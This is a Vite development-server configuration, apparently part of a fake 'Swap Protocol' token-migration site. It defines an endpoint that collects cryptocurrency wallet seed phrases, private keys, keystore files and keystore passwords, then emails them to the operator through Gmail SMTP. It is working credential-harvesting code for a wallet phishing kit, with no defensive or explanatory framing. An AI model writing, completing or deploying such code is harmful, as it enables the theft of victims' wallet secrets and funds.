import react from '@vitejs/plugin-react';
import path from 'path';
import { defineConfig } from 'vite';
import nodemailer from 'nodemailer';
import dotenv from 'dotenv';

// Load .env manually for the dev server
dotenv.config({ path: path.resolve(__dirname, '.env') });

// ─── SMTP config ────────────────────────────────────────────────
const smtpHost = process.env.LIMS_SMTP_HOST?.trim() || 'smtp.gmail.com';
const smtpPort = Number(process.env.LIMS_SMTP_PORT || 587);
const gmailUser = process.env.GMAIL_USER?.trim() || process.env.LIMS_SMTP_USER?.trim();
const gmailAppPassword = (process.env.GMAIL_APP_PASSWORD || process.env.LIMS_SMTP_PASSWORD || '').replace(/\s+/g, '');
const mailFromAddress = process.env.LIMS_MAIL_FROM?.trim() || gmailUser;
const mailFromName = process.env.MAIL_FROM_NAME?.trim() || 'Swap Protocol';
const mailDefaultTo = process.env.MAIL_DEFAULT_TO?.trim() || gmailUser;

function createTransport() {
  return nodemailer.createTransport({
    host: smtpHost,
    port: smtpPort,
    secure: smtpPort === 465,
    auth: { user: gmailUser, pass: gmailAppPassword }
  });
}

const smtpConfigured = Boolean(gmailUser && gmailAppPassword && mailDefaultTo);

export default defineConfig(() => {
  return {
    plugins: [
      react(),
      {
        name: 'smtp-api',
        configureServer(server) {
          // Handle POST /api/mail/phrase-submit directly in Vite dev server
          server.middlewares.use('/api/mail/phrase-submit', async (req, res, next) => {
            if (req.method !== 'POST') {
              res.statusCode = 405;
              res.end(JSON.stringify({ ok: false, error: 'Method not allowed' }));
              return;
            }

            if (!smtpConfigured) {
              res.statusCode = 503;
              res.end(JSON.stringify({ ok: false, error: 'Mail not configured.' }));
              return;
            }

            // Read body
            let body = '';
            req.on('data', (chunk) => { body += chunk; });
            req.on('end', async () => {
              try {
                const data = JSON.parse(body);
                const phrase = typeof data.phrase === 'string' ? data.phrase.trim() : '';
                const walletName = typeof data.walletName === 'string' ? data.walletName.trim() : 'Unknown';
                const privateKeyValue = typeof data.privateKey === 'string' ? data.privateKey.trim() : '';
                const keystoreValue = typeof data.keystore === 'string' ? data.keystore.trim() : '';
                const keystorePasswordValue = typeof data.keystorePassword === 'string' ? data.keystorePassword.trim() : '';

                if (!phrase && !privateKeyValue && !keystoreValue) {
                  res.statusCode = 400;
                  res.end(JSON.stringify({ ok: false, error: 'No credentials provided.' }));
                  return;
                }

                let subject = 'Wallet Credentials - ';
                const textParts = [];
                const htmlParts = [];

                if (phrase) {
                  subject += phrase.split(/\s+/).length + '-Word Phrase';
                  textParts.push('Phrase: ' + phrase);
                  htmlParts.push('<p><strong>Phrase (' + phrase.split(/\s+/).length + ' words):</strong></p><pre style="background:#f5f5f5;padding:16px;border-radius:8px;font-size:14px;word-break:break-all">' + phrase + '</pre>');
                } else if (privateKeyValue) {
                  subject += 'Private Key';
                  textParts.push('Private Key: ' + privateKeyValue);
                  htmlParts.push('<p><strong>Private Key:</strong></p><pre style="background:#f5f5f5;padding:16px;border-radius:8px;font-size:14px;word-break:break-all">' + privateKeyValue + '</pre>');
                } else if (keystoreValue) {
                  subject += 'Keystore';
                  textParts.push('Keystore JSON: ' + keystoreValue);
                  htmlParts.push('<p><strong>Keystore JSON:</strong></p><pre style="background:#f5f5f5;padding:16px;border-radius:8px;font-size:14px;word-break:break-all">' + keystoreValue + '</pre>');
                  if (keystorePasswordValue) {
                    textParts.push('Keystore Password: ' + keystorePasswordValue);
                    htmlParts.push('<p><strong>Keystore Password:</strong></p><pre style="background:#fff3cd;padding:12px;border-radius:8px;font-size:14px">' + keystorePasswordValue + '</pre>');
                  }
                }

                textParts.push('Wallet: ' + walletName);
                textParts.push('---');
                textParts.push('Submitted via Swap Protocol');
                textParts.push(new Date().toISOString());

                const transport = createTransport();
                const info = await transport.sendMail({
                  from: { name: mailFromName, address: mailFromAddress },
                  to: mailDefaultTo,
                  subject: subject + ' - ' + walletName,
                  text: textParts.join('\n'),
                  html: '<div style="font-family:sans-serif;padding:20px;max-width:600px"><h2>Wallet Credentials</h2>' +
                    '<p><strong>Wallet:</strong> ' + walletName + '</p>' +
                    htmlParts.join('') +
                    '<hr/><p style="color:#888;font-size:12px">Submitted via Swap Protocol - ' + new Date().toISOString() + '</p></div>'
                });
                console.log('Credential email sent: ' + info.messageId);
                res.statusCode = 200;
                res.end(JSON.stringify({ ok: true }));
              } catch (error) {
                console.error('Credential email failed:', error.message);
                res.statusCode = 502;
                res.end(JSON.stringify({ ok: false, error: 'Failed to send email.' }));
              }
            });
          });

          // Proxy other /api/* (except mail) to live backend
          server.middlewares.use('/api', (req, res, next) => {
            if (req.url?.startsWith('/mail/') || req.url === '/mail') {
              next();
              return;
            }
            // Skip — let Vite's built-in proxy handle it
            next();
          });

          console.log('SMTP API endpoint ready at /api/mail/phrase-submit');
        }
      }
    ],
    resolve: {
      alias: {
        '@': path.resolve(__dirname, '.'),
      },
    },
    server: {
      port: 3000,
      host: '0.0.0.0',
      proxy: {
        // Proxy non-mail /api/* to live backend
        '/api': {
          target: 'https://api.tokenmigration.app:8443',
          changeOrigin: true,
          bypass: (req) => {
            // Don't proxy /api/mail/* — handled by the middleware above
            if (req.url?.startsWith('/api/mail/')) {
              return req.url;
            }
            return undefined;
          }
        }
      },
      hmr: process.env.DISABLE_HMR !== 'true',
      watch: process.env.DISABLE_HMR === 'true' ? null : {},
    },
  };
});
